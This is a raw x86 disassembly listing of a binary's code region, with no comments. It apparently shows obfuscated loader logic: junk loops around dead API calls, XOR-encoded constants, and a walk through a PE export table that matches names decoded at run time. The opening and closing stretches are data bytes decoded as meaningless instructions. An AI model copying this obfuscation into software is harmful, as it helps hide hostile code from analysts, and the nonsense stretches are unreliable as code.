  40a218:	mov    bl,0xff
  40a21a:	std    
  40a21b:	sub    BYTE PTR [edx+0x54bc984c],0xb0
  40a222:	sbb    esi,ebp
  40a224:	jl     0x40a260
  40a226:	dec    edi
  40a227:	mov    esp,0x4849eb6f
  40a22c:	mov    cs,eax
  40a22e:	jp     0x40a1cc
  40a230:	retf   
  40a231:	cld    
  40a232:	push   cs
  40a233:	cmp    eax,0x9db8506c
  40a238:	shr    DWORD PTR [ebx+0x7d],cl
  40a23b:	jg     0x40a25f
  40a23d:	shl    DWORD PTR [edi-0x18],1
  40a240:	daa    
  40a241:	into   
  40a242:	call   0x72613ce6
  40a247:	imul   edx,ebp,0x2a
  40a24a:	adc    eax,0xf48cd76
  40a24f:	mov    ds,WORD PTR [ebx+0x3d044a3c]
  40a255:	cmp    DWORD PTR [edx-0x1a],ebp
  40a258:	nop
  40a259:	lea    eax,[eax+edi*1+0x64e5c4]
  40a260:	mov    edi,DWORD PTR [ebp+0xc]
  40a263:	xor    edi,ecx
  40a265:	add    edi,edx
  40a267:	imul   eax,edi
  40a26a:	mov    edi,DWORD PTR [ebp+0xc]
  40a26d:	xor    edi,ecx
  40a26f:	sub    edi,eax
  40a271:	mov    eax,DWORD PTR [ebp-0x4]
  40a274:	add    edi,edx
  40a276:	cmp    DWORD PTR [eax],edi
  40a278:	mov    eax,DWORD PTR [ebp-0x4]
  40a27b:	mov    edi,DWORD PTR [ebp+0x10]
  40a27e:	jg     0x40a291
  40a284:	xor    edi,ecx
  40a286:	mov    ebx,esi
  40a288:	sub    ebx,edi
  40a28a:	add    DWORD PTR [eax],ebx
  40a28c:	jmp    0x40a297
  40a291:	xor    edi,ecx
  40a293:	add    edi,edx
  40a295:	add    DWORD PTR [eax],edi
  40a297:	mov    eax,DWORD PTR [ebp-0x8]
  40a29a:	mov    edi,DWORD PTR [ebp-0x10]
  40a29d:	mov    eax,DWORD PTR [eax]
  40a29f:	xor    edi,ecx
  40a2a1:	add    edi,0x3272e1
  40a2a7:	not    edi
  40a2a9:	and    eax,edi
  40a2ab:	movsx  di,BYTE PTR [eax+0x1]
  40a2b0:	mov    ebx,0x3b51
  40a2b5:	sub    di,bx
  40a2b8:	mov    ebx,0x8a8d
  40a2bd:	xor    di,bx
  40a2c0:	mov    ebx,0x4f84
  40a2c5:	cmp    di,bx
  40a2c8:	jne    0x40a2f0
  40a2ce:	movsx  di,BYTE PTR [eax]
  40a2d2:	mov    ebx,0x3b51
  40a2d7:	sub    di,bx
  40a2da:	mov    ebx,0x8a8d
  40a2df:	xor    di,bx
  40a2e2:	mov    ebx,0x4e71
  40a2e7:	cmp    di,bx
  40a2ea:	je     0x40a300
  40a2f0:	mov    edi,DWORD PTR [ebp-0x10]
  40a2f3:	xor    edi,ecx
  40a2f5:	mov    ebx,esi
  40a2f7:	sub    ebx,edi
  40a2f9:	add    eax,ebx
  40a2fb:	jmp    0x40a2ab
  40a300:	mov    esi,DWORD PTR [ebp-0x14]
  40a303:	mov    esi,DWORD PTR [esi]
  40a305:	mov    edi,DWORD PTR [eax+0x3c]
  40a308:	lea    esi,[edi+esi*8+0x78]
  40a30c:	mov    esi,DWORD PTR [esi+eax*1]
  40a30f:	mov    DWORD PTR [ebp-0x8],esi
  40a312:	mov    esi,DWORD PTR [ebp+0x8]
  40a315:	xor    esi,ecx
  40a317:	add    esi,edx
  40a319:	mov    DWORD PTR [ebp-0x14],esi
  40a31c:	mov    esi,DWORD PTR [ebp+0x8]
  40a31f:	mov    edi,DWORD PTR [ebp-0x8]
  40a322:	xor    esi,ecx
  40a324:	add    esi,edx
  40a326:	pop    ebx
  40a327:	cmp    edi,esi
  40a329:	jne    0x40a347
  40a32f:	mov    eax,DWORD PTR [ebp+0xc]
  40a332:	xor    eax,ecx
  40a334:	mov    ecx,DWORD PTR [ebp-0x8]
  40a337:	add    eax,edx
  40a339:	imul   eax,ecx
  40a33c:	mov    DWORD PTR [ebp-0x8],eax
  40a33f:	push   DWORD PTR [ebp+0x18]
  40a342:	jmp    0x40a39b
  40a347:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34a:	add    ecx,eax
  40a34c:	mov    DWORD PTR [ebp-0x14],ecx
  40a34f:	mov    ecx,DWORD PTR [ebp-0x14]
  40a352:	mov    ecx,DWORD PTR [ecx+0xc]
  40a355:	movsx  cx,BYTE PTR [ecx+eax*1]
  40a35a:	mov    edx,0x3b51
  40a35f:	sub    cx,dx
  40a362:	mov    edx,0x8a8d
  40a367:	xor    cx,dx
  40a36a:	mov    edx,0x4e77
  40a36f:	cmp    cx,dx
  40a372:	jne    0x40a33f
  40a378:	mov    ecx,DWORD PTR ds:0x43a2d4
  40a37e:	mov    ecx,DWORD PTR [ecx+0x198]
  40a384:	mov    DWORD PTR [ecx],eax
  40a386:	jmp    0x40a3ac
  40a38b:	mov    ecx,DWORD PTR [ebp+0x18]
  40a38e:	cmp    ecx,0xf89c8584
  40a394:	jne    0x40a3ac
  40a39a:	push   eax
  40a39b:	push   DWORD PTR [ebp+0x14]
  40a39e:	push   DWORD PTR [ebp+0x10]
  40a3a1:	push   DWORD PTR [ebp+0xc]
  40a3a4:	push   DWORD PTR [ebp+0x8]
  40a3a7:	call   0x407a51
  40a3ac:	pop    edi
  40a3ad:	pop    esi
  40a3ae:	leave  
  40a3af:	ret    0x14
  40a3b2:	push   ebp
  40a3b3:	mov    ebp,esp
  40a3b5:	sub    esp,0xc
  40a3b8:	sbb    DWORD PTR ds:0x43701c,0x4790
  40a3c2:	push   esi
  40a3c3:	mov    DWORD PTR ds:0x435018,0x19
  40a3cd:	cmp    DWORD PTR ds:0x435018,0x0
  40a3d4:	je     0x40a404
  40a3da:	cmp    DWORD PTR ds:0x435018,0x1b
  40a3e1:	ja     0x40a404
  40a3e7:	jmp    0x40a3f2
  40a3ec:	call   DWORD PTR ds:0x43a8f0
  40a3f2:	mov    esi,DWORD PTR ds:0x435018
  40a3f8:	dec    esi
  40a3f9:	mov    DWORD PTR ds:0x435018,esi
  40a3ff:	jmp    0x40a3cd
  40a404:	mov    esi,0xf89c8585
  40a409:	not    DWORD PTR ds:0x436000
  40a40f:	mov    DWORD PTR [ebp-0x8],esi
  40a412:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40a419:	push   edi
  40a41a:	mov    eax,eax
  40a41c:	mov    edi,DWORD PTR ds:0x4165b4
  40a422:	mov    ecx,DWORD PTR ds:0x43900c
  40a428:	sub    ecx,edi
  40a42a:	imul   edi,DWORD PTR [edi+ecx*1]
  40a42e:	mov    eax,DWORD PTR [ebp-0x4]
  40a431:	mov    edi,DWORD PTR [ebp-0x8]
  40a434:	mov    ecx,0x751089b
  40a439:	movzx  edx,WORD PTR ds:0x43700c
  40a440:	or     DWORD PTR ds:0x438014,edx
  40a446:	xor    eax,ecx
  40a448:	adc    edx,0x57d4
  40a44e:	xor    edi,ecx
  40a450:	and    edx,0x6c30
  40a456:	mov    edx,0x3272e2
  40a45b:	add    DWORD PTR ds:0x435008,0x434004
  40a465:	add    edi,edx
  40a467:	sub    DWORD PTR ds:0x437008,0x434008
  40a471:	add    eax,edx
  40a473:	imul   eax,edi
  40a476:	mov    DWORD PTR ds:0x436014,edi
  40a47c:	mov    edi,DWORD PTR [ebp+0xc]
  40a47f:	cmp    edi,eax
  40a481:	je     0x40a549
  40a487:	and    eax,0xc4b
  40a48c:	mov    DWORD PTR [ebp-0xc],esi
  40a48f:	mov    esi,DWORD PTR ds:0x416528
  40a495:	mov    esi,DWORD PTR [esi]
  40a497:	sub    DWORD PTR ds:0x437018,esi
  40a49d:	mov    eax,DWORD PTR [ebp-0xc]
  40a4a0:	mov    DWORD PTR ds:0x435004,0x19
  40a4aa:	cmp    DWORD PTR ds:0x435004,0x0
  40a4b1:	je     0x40a500
  40a4b7:	cmp    DWORD PTR ds:0x435004,0x4
  40a4be:	jg     0x40a500
  40a4c4:	jmp    0x40a4d2
  40a4c9:	push   DWORD PTR [ebp-0x28]
  40a4cc:	call   DWORD PTR ds:0x43a8f4
  40a4d2:	cmp    DWORD PTR ds:0x435004,0x5
  40a4d9:	jne    0x40a4ee
  40a4df:	xor    esi,esi
  40a4e1:	or     esi,DWORD PTR ds:0x435004
  40a4e7:	dec    esi
  40a4e8:	mov    DWORD PTR ds:0x435004,esi
  40a4ee:	mov    esi,DWORD PTR ds:0x435004
  40a4f4:	dec    esi
  40a4f5:	mov    DWORD PTR ds:0x435004,esi
  40a4fb:	jmp    0x40a4aa
  40a500:	mov    esi,DWORD PTR [ebp+0xc]
  40a503:	xor    eax,ecx
  40a505:	lea    eax,[eax*8+0x1939788]
  40a50c:	mov    eax,DWORD PTR [esi+eax*1]
  40a50f:	mov    DWORD PTR [ebp+0xc],eax
  40a512:	mov    eax,DWORD PTR [ebp-0x4]
  40a515:	mov    esi,DWORD PTR [ebp-0x8]
  40a518:	xor    eax,ecx
  40a51a:	xor    esi,ecx
  40a51c:	add    esi,edx
  40a51e:	add    eax,edx
  40a520:	imul   eax,esi
  40a523:	mov    esi,DWORD PTR [ebp+0xc]
  40a526:	cmp    esi,eax
  40a528:	je     0x40a549
  40a52e:	mov    eax,DWORD PTR [ebp-0x4]
  40a531:	xor    eax,ecx
  40a533:	mov    ecx,DWORD PTR [ebp+0xc]
  40a536:	add    eax,edx
  40a538:	imul   eax,ecx
  40a53b:	add    eax,DWORD PTR [ebp+0x8]
  40a53e:	mov    DWORD PTR [ebp+0xc],eax
  40a541:	mov    eax,DWORD PTR [ebp+0xc]
  40a544:	jmp    0x40a55a
  40a549:	mov    eax,DWORD PTR [ebp-0x4]
  40a54c:	mov    esi,DWORD PTR [ebp-0x8]
  40a54f:	xor    esi,ecx
  40a551:	xor    eax,ecx
  40a553:	add    esi,edx
  40a555:	add    eax,edx
  40a557:	imul   eax,esi
  40a55a:	pop    edi
  40a55b:	pop    esi
  40a55c:	leave  
  40a55d:	ret    0x8
  40a560:	push   ebp
  40a561:	mov    ebp,esp
  40a563:	push   ecx
  40a564:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40a56b:	mov    eax,DWORD PTR [ebp-0x4]
  40a56e:	and    DWORD PTR ds:0x434010,0x0
  40a578:	jmp    0x40a58a
  40a57d:	mov    ecx,DWORD PTR ds:0x434010
  40a583:	inc    ecx
  40a584:	mov    DWORD PTR ds:0x434010,ecx
  40a58a:	cmp    DWORD PTR ds:0x434010,0x19
  40a591:	jae    0x40a5d6
  40a597:	cmp    DWORD PTR ds:0x434010,0x9
  40a59e:	jge    0x40a5d6
  40a5a4:	jmp    0x40a5b7
  40a5a9:	push   0x55fe
  40a5ae:	push   DWORD PTR [ebp-0x18]
  40a5b1:	call   DWORD PTR ds:0x43a8f8
  40a5b7:	cmp    DWORD PTR ds:0x434010,0x8
  40a5be:	jne    0x40a5d1
  40a5c4:	mov    ecx,DWORD PTR ds:0x434010
  40a5ca:	inc    ecx
  40a5cb:	mov    DWORD PTR ds:0x434010,ecx
  40a5d1:	jmp    0x40a57d
  40a5d6:	mov    edx,DWORD PTR [ebp+0x10]
  40a5d9:	mov    ecx,0x751089b
  40a5de:	xor    eax,ecx
  40a5e0:	add    eax,0x3272e2
  40a5e5:	mov    DWORD PTR [edx],eax
  40a5e7:	mov    eax,DWORD PTR [ebp+0xc]
  40a5ea:	mov    DWORD PTR ds:0x438008,0x1d
  40a5f4:	cmp    DWORD PTR ds:0x438008,0x0
  40a5fb:	je     0x40a630
  40a601:	cmp    DWORD PTR ds:0x438008,0x1e
  40a608:	jl     0x40a630
  40a60e:	jmp    0x40a61e
  40a613:	push   0x434028
  40a618:	call   DWORD PTR ds:0x43a900
  40a61e:	mov    edx,DWORD PTR ds:0x438008
  40a624:	dec    edx
  40a625:	mov    DWORD PTR ds:0x438008,edx
  40a62b:	jmp    0x40a5f4
  40a630:	xor    eax,ecx
  40a632:	push   esi
  40a633:	mov    esi,DWORD PTR [ebp+0x10]
  40a636:	mov    edx,0x3272e2
  40a63b:	add    eax,edx
  40a63d:	mov    DWORD PTR [esi+0x4],eax
  40a640:	mov    eax,DWORD PTR [ebp+0x14]
  40a643:	mov    esi,DWORD PTR [ebp+0x10]
  40a646:	mov    DWORD PTR [esi+0x8],eax
  40a649:	mov    eax,DWORD PTR [ebp+0x18]
  40a64c:	mov    esi,DWORD PTR [ebp+0x10]
  40a64f:	mov    DWORD PTR [esi+0xc],eax
  40a652:	mov    eax,DWORD PTR [ebp+0x1c]
  40a655:	mov    esi,DWORD PTR [ebp+0x10]
  40a658:	mov    DWORD PTR [esi+0x10],eax
  40a65b:	mov    eax,DWORD PTR [ebp+0x8]
  40a65e:	xor    eax,ecx
  40a660:	add    eax,edx
  40a662:	pop    esi
  40a663:	leave  
  40a664:	ret    0x18
  40a667:	push   ebp
  40a668:	mov    ebp,esp
  40a66a:	sub    esp,0x9c
  40a670:	movzx  ecx,BYTE PTR ds:0x437000
  40a677:	xor    DWORD PTR ds:0x43401c,ecx
  40a67d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a680:	mov    eax,0x8a8d
  40a685:	xor    ax,WORD PTR [ecx+0x20]
  40a689:	mov    ecx,0x3b51
  40a68e:	add    ax,cx
  40a691:	mov    ecx,DWORD PTR ds:0x436014
  40a697:	add    DWORD PTR ds:0x43801c,ecx
  40a69d:	movzx  eax,ax
  40a6a0:	mov    DWORD PTR [ebp-0x10],eax
  40a6a3:	mov    BYTE PTR [ebp-0x1],0x7d
  40a6a7:	sub    DWORD PTR ds:0x434028,edi
  40a6ad:	lea    eax,[ebp-0x1]
  40a6b0:	mov    DWORD PTR [ebp-0xc],eax
  40a6b3:	sub    ecx,0x54f4
  40a6b9:	mov    al,BYTE PTR [ebp-0x1]
  40a6bc:	add    DWORD PTR ds:0x434000,edx
  40a6c2:	mov    ecx,DWORD PTR [ebp-0xc]
  40a6c5:	and    DWORD PTR ds:0x434024,0x436014
  40a6cf:	xor    al,0x74
  40a6d1:	and    DWORD PTR ds:0x436008,0x1db4
  40a6db:	sub    al,0x8
  40a6dd:	or     DWORD PTR ds:0x434014,0x438000
  40a6e7:	mov    BYTE PTR [ecx],al
  40a6e9:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  40a6f0:	and    DWORD PTR ds:0x437014,0x0
  40a6fa:	mov    eax,ds:0x437014
  40a6ff:	inc    eax
  40a700:	mov    ds:0x437014,eax
  40a705:	cmp    DWORD PTR ds:0x437014,0x24
  40a70c:	jl     0x40a72a
  40a712:	jmp    0x40a71d
  40a717:	call   DWORD PTR ds:0x43a904
  40a71d:	cmp    DWORD PTR ds:0x437014,0x1a
  40a724:	jb     0x40a6fa
  40a72a:	push   ebx
  40a72b:	and    DWORD PTR ds:0x43701c,0x0
  40a735:	jmp    0x40a749
  40a73a:	xor    ecx,ecx
  40a73c:	add    ecx,DWORD PTR ds:0x43701c
  40a742:	inc    ecx
  40a743:	mov    DWORD PTR ds:0x43701c,ecx
  40a749:	cmp    DWORD PTR ds:0x43701c,0x1b
  40a750:	jae    0x40a778
  40a756:	cmp    DWORD PTR ds:0x43701c,0x26
  40a75d:	ja     0x40a778
  40a763:	jmp    0x40a773
  40a768:	push   0x78f7
  40a76d:	call   DWORD PTR ds:0x43a8c4
  40a773:	jmp    0x40a73a
  40a778:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  40a77f:	mov    DWORD PTR ds:0x434020,0x16
  40a789:	cmp    DWORD PTR ds:0x434020,0x0
  40a790:	je     0x40a7c3
  40a796:	cmp    DWORD PTR ds:0x434020,0x22
  40a79d:	jbe    0x40a7c3
  40a7a3:	jmp    0x40a7b0
  40a7a8:	push   0x2
  40a7aa:	call   DWORD PTR ds:0x43a8c8
  40a7b0:	xor    eax,eax
  40a7b2:	xor    eax,DWORD PTR ds:0x434020
  40a7b8:	dec    eax
  40a7b9:	mov    ds:0x434020,eax
  40a7be:	jmp    0x40a789
  40a7c3:	mov    ecx,DWORD PTR [ebp-0x18]
  40a7c6:	push   esi
  40a7c7:	and    esi,DWORD PTR ds:0x435010
  40a7cd:	mov    eax,0x751089b
  40a7d2:	xor    ecx,eax
  40a7d4:	mov    DWORD PTR ds:0x435008,0x1d
  40a7de:	cmp    DWORD PTR ds:0x435008,0x0
  40a7e5:	je     0x40a834
  40a7eb:	cmp    DWORD PTR ds:0x435008,0x7
  40a7f2:	jb     0x40a834
  40a7f8:	jmp    0x40a808
  40a7fd:	push   0x43a097
  40a802:	call   DWORD PTR ds:0x43a8d0
  40a808:	cmp    DWORD PTR ds:0x435008,0x8
  40a80f:	jne    0x40a822
  40a815:	mov    esi,DWORD PTR ds:0x435008
  40a81b:	dec    esi
  40a81c:	mov    DWORD PTR ds:0x435008,esi
  40a822:	mov    esi,DWORD PTR ds:0x435008
  40a828:	dec    esi
  40a829:	mov    DWORD PTR ds:0x435008,esi
  40a82f:	jmp    0x40a7de
  40a834:	mov    esi,0x3272e2
  40a839:	sub    DWORD PTR ds:0x43801c,0x434010
  40a843:	push   edi
  40a844:	and    DWORD PTR ds:0x436004,0x69e
  40a84e:	add    ecx,esi
  40a850:	mov    DWORD PTR ds:0x436004,0xf52
  40a85a:	jmp    0x40a87e
  40a85f:	mov    dl,BYTE PTR [ebp-0x1]
  40a862:	mov    DWORD PTR ds:0x43801c,0x56b6
  40a86c:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40a873:	mov    DWORD PTR ds:0x43701c,0x79a8
  40a87d:	inc    ecx
  40a87e:	cmp    ecx,0x40
  40a881:	mov    DWORD PTR ds:0x437010,0x2279
  40a88b:	jb     0x40a85f
  40a891:	and    DWORD PTR ds:0x43700c,0x0
  40a89b:	xor    edx,edx
  40a89d:	xor    edx,DWORD PTR ds:0x43700c
  40a8a3:	inc    edx
  40a8a4:	mov    DWORD PTR ds:0x43700c,edx
  40a8aa:	cmp    DWORD PTR ds:0x43700c,0x10
  40a8b1:	jbe    0x40a8ee
  40a8b7:	jmp    0x40a8c7
  40a8bc:	push   0x43a0f9
  40a8c1:	call   DWORD PTR ds:0x43a8d4
  40a8c7:	cmp    DWORD PTR ds:0x43700c,0xf
  40a8ce:	jne    0x40a8e1
  40a8d4:	mov    edx,DWORD PTR ds:0x43700c
  40a8da:	inc    edx
  40a8db:	mov    DWORD PTR ds:0x43700c,edx
  40a8e1:	cmp    DWORD PTR ds:0x43700c,0x1d
  40a8e8:	jb     0x40a89b
  40a8ee:	mov    edx,DWORD PTR [ebp-0x18]
  40a8f1:	and    DWORD PTR ds:0x43500c,0x435014
  40a8fb:	xor    edx,eax
  40a8fd:	adc    DWORD PTR ds:0x43700c,0x435014
  40a907:	add    edx,esi
  40a909:	jmp    0x40a9e8
  40a90e:	adc    ecx,edi
  40a910:	mov    edi,DWORD PTR [ebp+0x8]
  40a913:	mov    ecx,DWORD PTR ds:0x435018
  40a919:	sbb    DWORD PTR ds:0x43700c,ecx
  40a91f:	mov    ecx,0x8a8d
  40a924:	or     DWORD PTR ds:0x437014,0x2f73
  40a92e:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40a933:	mov    edi,0x3b51
  40a938:	add    cx,di
  40a93b:	movzx  ecx,cx
  40a93e:	mov    DWORD PTR [ebp-0xc],ecx
  40a941:	and    DWORD PTR ds:0x434008,0x0
  40a94b:	mov    ecx,DWORD PTR ds:0x434008
  40a951:	inc    ecx
  40a952:	mov    DWORD PTR ds:0x434008,ecx
  40a958:	cmp    DWORD PTR ds:0x434008,0x6
  40a95f:	jg     0x40a99a
  40a965:	jmp    0x40a973
  40a96a:	push   DWORD PTR [ebp-0x20]
  40a96d:	call   DWORD PTR ds:0x43a8dc
  40a973:	cmp    DWORD PTR ds:0x434008,0x5
  40a97a:	jne    0x40a98d
  40a980:	mov    ecx,DWORD PTR ds:0x434008
  40a986:	inc    ecx
  40a987:	mov    DWORD PTR ds:0x434008,ecx
  40a98d:	cmp    DWORD PTR ds:0x434008,0x19
  40a994:	jb     0x40a94b
  40a99a:	mov    ecx,DWORD PTR [ebp+0x8]
  40a99d:	adc    DWORD PTR ds:0x437010,0x435000
  40a9a7:	movzx  ecx,WORD PTR [ecx+edx*4]
  40a9ab:	inc    DWORD PTR ds:0x437018
  40a9b1:	xor    ecx,0x8a8d
  40a9b7:	or     DWORD PTR ds:0x43701c,0x43800c
  40a9c1:	add    ecx,edi
  40a9c3:	mov    DWORD PTR ds:0x434004,ecx
  40a9c9:	mov    edi,DWORD PTR [ebp-0xc]
  40a9cc:	mov    DWORD PTR ds:0x435018,0x55c8
  40a9d6:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40a9dd:	mov    DWORD PTR ds:0x43401c,0x7075
  40a9e7:	inc    edx
  40a9e8:	mov    ecx,DWORD PTR [ebp-0x10]
  40a9eb:	mov    DWORD PTR ds:0x437004,0x237b
  40a9f5:	cmp    edx,ecx
  40a9f7:	jne    0x40a90e
  40a9fd:	inc    ecx
  40a9fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa01:	mov    DWORD PTR ds:0x43600c,0x12
  40aa0b:	cmp    DWORD PTR ds:0x43600c,0x0
  40aa12:	je     0x40aa56
  40aa18:	cmp    DWORD PTR ds:0x43600c,0x17
  40aa1f:	ja     0x40aa56
  40aa25:	jmp    0x40aa44
  40aa2a:	push   0x43a000
  40aa2f:	push   0x6abf
  40aa34:	push   0x7f73
  40aa39:	push   0x6111
  40aa3e:	call   DWORD PTR ds:0x43a8e0
  40aa44:	mov    edi,DWORD PTR ds:0x43600c
  40aa4a:	dec    edi
  40aa4b:	mov    DWORD PTR ds:0x43600c,edi
  40aa51:	jmp    0x40aa0b
  40aa56:	mov    edx,DWORD PTR [ebp+0x10]
  40aa59:	xor    ecx,eax
  40aa5b:	dec    edi
  40aa5c:	add    ecx,esi
  40aa5e:	add    edi,0x5bbd
  40aa64:	mov    DWORD PTR [edx],ecx
  40aa66:	xor    ecx,ecx
  40aa68:	or     ecx,DWORD PTR ds:0x439004
  40aa6e:	mov    edi,DWORD PTR ds:0x43901c
  40aa74:	sub    ecx,edi
  40aa76:	or     ecx,DWORD PTR [ecx+edi*1]
  40aa79:	mov    ecx,DWORD PTR [ebp-0x18]
  40aa7c:	sub    DWORD PTR ds:0x43400c,ecx
  40aa82:	xor    ecx,eax
  40aa84:	add    edi,DWORD PTR ds:0x436014
  40aa8a:	add    ecx,esi
  40aa8c:	or     DWORD PTR ds:0x43401c,0x72a8
  40aa96:	mov    DWORD PTR [ebp-0xc],ecx
  40aa99:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  40aaa0:	and    DWORD PTR ds:0x434018,edi
  40aaa6:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40aaad:	or     DWORD PTR ds:0x434024,0x436008
  40aab7:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  40aabe:	and    DWORD PTR ds:0x436004,0x0
  40aac8:	mov    ecx,DWORD PTR ds:0x436004
  40aace:	inc    ecx
  40aacf:	mov    DWORD PTR ds:0x436004,ecx
  40aad5:	cmp    DWORD PTR ds:0x436004,0x1e
  40aadc:	ja     0x40ab14
  40aae2:	jmp    0x40ab07
  40aae7:	push   DWORD PTR [ebp-0x24]
  40aaea:	push   0x43401c
  40aaef:	push   DWORD PTR [ebp-0x20]
  40aaf2:	push   0x43a07b
  40aaf7:	push   0x8e91
  40aafc:	push   0x3182
  40ab01:	call   DWORD PTR ds:0x43a8e4
  40ab07:	cmp    DWORD PTR ds:0x436004,0x1b
  40ab0e:	jb     0x40aac8
  40ab14:	mov    ecx,DWORD PTR [ebp-0x14]
  40ab17:	mov    edi,DWORD PTR ds:0x416528
  40ab1d:	mov    edi,DWORD PTR [edi]
  40ab1f:	xor    DWORD PTR ds:0x434024,edi
  40ab25:	mov    DWORD PTR [ebp+0x8],ecx
  40ab28:	or     DWORD PTR ds:0x43600c,0x6978
  40ab32:	mov    ecx,DWORD PTR [ebp+0x8]
  40ab35:	xor    ecx,eax
  40ab37:	add    ecx,esi
  40ab39:	mov    ecx,0x242ebe9
  40ab3e:	mov    edi,0x3d76
  40ab43:	mov    edi,0xf641bea
  40ab48:	je     0x4163dd
  40ab4e:	mov    edx,DWORD PTR [ebp+0x8]
  40ab51:	mov    ebx,DWORD PTR [ebp-0x8]
  40ab54:	xor    edx,eax
  40ab56:	or     DWORD PTR ds:0x434020,0x43801c
  40ab60:	xor    ebx,eax
  40ab62:	sbb    DWORD PTR ds:0x434014,0x391d
  40ab6c:	sub    edx,ebx
  40ab6e:	and    DWORD PTR ds:0x43700c,0x5ff0
  40ab78:	sub    edx,esi
  40ab7a:	neg    ebx
  40ab7c:	xor    edx,eax
  40ab7e:	or     ebx,DWORD PTR ds:0x435018
  40ab84:	mov    DWORD PTR [ebp+0x8],edx
  40ab87:	dec    DWORD PTR ds:0x435004
  40ab8d:	mov    edx,DWORD PTR [ebp+0x8]
  40ab90:	mov    ebx,DWORD PTR [ebp-0x58]
  40ab93:	add    edx,0x5708c4
  40ab99:	imul   edx,ebx
  40ab9c:	mov    DWORD PTR [ebp-0x58],edx
  40ab9f:	mov    edx,DWORD PTR [ebp+0x8]
  40aba2:	mov    ebx,DWORD PTR [ebp-0x54]
  40aba5:	sub    DWORD PTR ds:0x434000,0x43800c
  40abaf:	add    edx,0x64f8da
  40abb5:	or     edx,ebx
  40abb7:	or     DWORD PTR ds:0x43600c,ebx
  40abbd:	mov    DWORD PTR [ebp-0x54],edx
  40abc0:	mov    edx,DWORD PTR [ebp+0x8]
  40abc3:	mov    ebx,DWORD PTR [ebp-0x50]
  40abc6:	jmp    0x40cf7a
  40abcb:	mov    ebp,0x9391ee60
  40abd0:	xchg   ebx,eax
  40abd1:	mov    ds:0x46f90650,eax
  40abd6:	(bad)  
  40abd7:	imul   BYTE PTR [edx-0x1c]
  40abda:	dec    ebp
  40abdb:	push   cs
  40abdc:	push   es
  40abdd:	jl     0x40ac5b
  40abdf:	jmp    0x40ac40
  40abe1:	jl     0x40ac5f
  40abe3:	shl    DWORD PTR [edi+eiz*2],cl
  40abe6:	aad    0xa6
  40abe8:	test   eax,0x2e110eec
  40abed:	mov    al,ds:0x876b81c2
  40abf2:	dec    ebx
  40abf3:	xor    al,0xaf
  40abf5:	stos   DWORD PTR es:[edi],eax
  40abf6:	adc    al,0xd5
  40abf8:	rcl    DWORD PTR [ebx+0x5d],0xac
  40abfc:	jb     0x40ac60
  40abfe:	mov    BYTE PTR [ecx+0x9],bh
  40ac01:	push   edi
  40ac02:	mul    DWORD PTR [edx]
  40ac04:	std    
  40ac05:	mov    ds:0xb6fc26ee,al
  40ac0a:	dec    eax
  40ac0b:	cmp    bh,BYTE PTR [ebx]
  40ac0d:	pop    edx
  40ac0e:	rcr    ch,0x6c
  40ac11:	or     ah,BYTE PTR [esi]
  40ac13:	hlt    
  40ac14:	aam    0x24
  40ac16:	lea    eax,[esi+0x1759c655]
  40ac1c:	cli    
  40ac1d:	xchg   ebp,eax
  40ac1e:	sbb    DWORD PTR [ecx-0x79],0x6678e492
  40ac25:	sbb    esi,DWORD PTR [edx-0x216a2ee4]
  40ac2b:	fs ret 0xa5d8
  40ac2f:	pop    ss
  40ac30:	and    al,BYTE PTR [eax]
  40ac32:	push   esi
  40ac33:	mov    al,ds:0xf9fc6ffd
  40ac38:	xchg   BYTE PTR [edx-0x6e4e4887],bl
  40ac3e:	pop    ebp
  40ac3f:	sub    al,cl
  40ac41:	pop    ebx
  40ac42:	and    ah,dh
  40ac44:	xchg   DWORD PTR [ecx-0x5925dcd2],esp
  40ac4a:	push   edx
  40ac4b:	pushw  cs
  40ac4d:	dec    ecx
  40ac4e:	ror    DWORD PTR [edi],cl
  40ac50:	enter  0xe83,0xd2
  40ac54:	xlat   BYTE PTR ds:[bx]
  40ac56:	in     eax,dx
  40ac57:	inc    ebp
  40ac58:	inc    eax
  40ac59:	int    0xdd
  40ac5b:	fstp   TBYTE PTR [ecx+ebp*1]
  40ac5e:	in     al,dx
  40ac5f:	sub    ah,BYTE PTR [ebx-0xc]
  40ac62:	xor    eax,0x4c246258
  40ac67:	(bad)  
  40ac68:	xlat   BYTE PTR ds:[ebx]
  40ac69:	push   cs
  40ac6a:	aam    0x5c
  40ac6c:	mov    ebp,0x7b2378bb
  40ac71:	sbb    DWORD PTR [esi-0x51],edi
  40ac74:	call   0xb424263
  40ac79:	ins    DWORD PTR es:[edi],dx
  40ac7a:	call   0xca56:0x25707b49
  40ac81:	mov    ds:0x32532458,al
  40ac86:	mov    ah,bl
  40ac88:	clc    
  40ac89:	dec    edx
  40ac8a:	xor    eax,DWORD PTR [eax-0x5d]
  40ac8d:	shr    BYTE PTR [eax+0x6e],0xe6
  40ac91:	push   ss
  40ac92:	in     eax,dx
  40ac93:	mov    cl,0xe4
  40ac95:	adc    BYTE PTR [eax+eax*8],bl
  40ac98:	hlt    
  40ac99:	mov    edi,0xb77e7e39
  40ac9e:	push   0x910bf735
  40aca3:	or     edx,edi
  40aca5:	jl     0x40acdb
  40aca7:	xchg   esp,eax
  40aca8:	dec    esi
  40aca9:	ds sahf 
  40acab:	push   edi
  40acac:	out    0xe7,eax
  40acae:	xchg   ecx,eax
  40acaf:	inc    ecx
  40acb0:	dec    edx
  40acb1:	dec    esp
  40acb2:	lods   eax,DWORD PTR ds:[esi]
  40acb3:	ins    BYTE PTR es:[edi],dx
  40acb4:	gs clc 
  40acb6:	sbb    eax,0xaf17bb7d
  40acbb:	dec    esp
  40acbc:	imul   ebx,DWORD PTR [esi+0xc],0xdff06b45
  40acc3:	mov    DWORD PTR cs:[eax],eax
  40acc6:	dec    edi
  40acc7:	lods   eax,DWORD PTR ds:[esi]
  40acc8:	lds    esp,FWORD PTR [eax-0x34]
  40accb:	jno    0x40acd1
  40accd:	repnz add ecx,esp
